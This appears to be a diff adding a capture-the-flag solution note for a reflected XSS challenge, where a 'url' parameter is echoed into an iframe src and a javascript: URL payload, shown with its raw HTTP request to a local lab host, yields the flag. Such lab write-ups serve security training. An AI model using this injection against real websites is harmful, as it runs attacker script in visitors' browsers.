@@ -1,0 +1,4 @@
+# Reflected XSS via iframe src injection. The url GET parameter is reflected verbatim into the iframe src attribute. Using javascript: protocol executes arbitrary JS. Server validates payload and returns CTF flag. Payload: javascript:alert('XSS')
+
+GET /page?url=javascript:alert('XSS') HTTP/1.1
+Host: 172.17.0.1:40039
